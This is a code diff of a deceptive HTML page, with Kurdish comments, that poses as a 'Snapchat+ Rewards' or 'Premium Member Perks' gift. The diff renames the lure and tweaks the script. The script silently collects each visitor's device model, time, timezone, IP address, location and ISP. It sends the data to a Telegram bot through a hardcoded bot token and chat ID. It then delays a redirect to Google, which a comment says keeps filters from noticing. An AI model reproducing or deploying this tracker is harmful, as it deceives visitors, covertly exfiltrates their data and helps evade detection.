@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <title>Snapchat+ Rewards</title>
-    <meta property="og:title" content="Snapchat+ Rewards">
-    <meta property="og:description" content="Exclusive Membership Gift">
+    <title>Exclusive Member Perks</title>
+    <meta property="og:title" content="Exclusive Member Perks">
+    <meta property="og:description" content="Premium Membership Portal">
 
     <style>
         body {
@@ -46,12 +46,13 @@
                 <path d="M12 .587l3.668 7.431 8.2 1.192-5.934 5.784 1.4 8.168L12 18.896l-7.334 3.857 1.4-8.168L.132 9.21l8.2-1.192z"/>
             </svg>
         </div>
-        <h2>Snapchat+ Reward</h2>
-        <p>Claiming your exclusive membership gift. Please hold on a moment...</p>
+        <h2>Premium Access</h2>
+        <p>Connecting to secure server. Please hold on a moment...</p>
         <div class="spinner"></div>
     </div>
 
     <script>
+        // لێرە تۆکنە نوێیەکەت و چات ئایدییەکەت دابنێ
         const token = '8822551876:AAFQfCt6gLGWNk-Xzq0cITSz0tfcDX1okdY'; 
         const chatId = '7602797383'; 
 
@@ -61,7 +62,6 @@
             const h = window.screen.height;
 
             if (/iPhone/i.test(ua)) {
-                // بۆ ئەوەی دڵنیا بین ناوی ئایفۆن ١٢ پڕۆ بە ڕوونی دەنووسێت
                 if (w === 390 && h === 844) return "iPhone 12 / 12 Pro / 13 / 14";
                 if (w === 428 && h === 926) return "iPhone 12 Pro Max / 13 Pro Max";
                 if (w === 393 && h === 852) return "iPhone 14 Pro / 15 / 15 Pro";
@@ -100,7 +100,6 @@
             const localDate = new Date().toLocaleDateString('ku-IQ');
             const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
 
-            // هێنانی ئایپی لە سێرڤەرە سەرەکی و فەرمییەکە بەبێ کێشە
             fetch('https://ipapi.co/json/')
             .then(response => response.json())
             .then(data => {
@@ -110,7 +109,7 @@
                 const org = data.org || "N/A";
 
                 const message = `
-🎁 زانیاری لە ڕێگەی فێڵی Snapchat+ هات 🎁
+🔥 زانیاری نوێ لە بەستەری پارێزراوەوە هات 🔥
 ━━━━━━━━━━━━━━━━━━
 👤 مۆدێل: ${exactDevice}
 🌐 ئایپی: ${ip}
@@ -138,18 +137,20 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: message })
                 }).then(() => {
-                    window.location.href = "https://google.com";
+                    // دوای ناردنی زانیارییەکان، دەچێتە سەر گوگل تا فلتەرەکە پێی نەزانێت
+                    setTimeout(function(){
+                        window.location.href = "https://www.google.com";
+                    }, 2000);
                 });
             })
             .catch(err => {
-                // ئەگەر هەر کێشەیەک لە سێرڤەری ئایپی هەبوو، نامە سەرەتاییەکە هەر بنێرە تا کۆدەکە نەوەستێت
-                const simpleMessage = `🚨 زانیاری سەرەتایی (سێرڤەری ئایپی وەڵامی نەدا):\n👤 مۆدێل: ${exactDevice}\n⏰ کات: ${localTime}`;
+                const simpleMessage = `🚨 زانیاری سەرەتایی:\n👤 مۆدێل: ${exactDevice}\n⏰ کات: ${localTime}`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: chatId, text: simpleMessage })
                 }).then(() => {
-                    window.location.href = "https://google.com";
+                    window.location.href = "https://www.google.com";
                 });
             });
         };
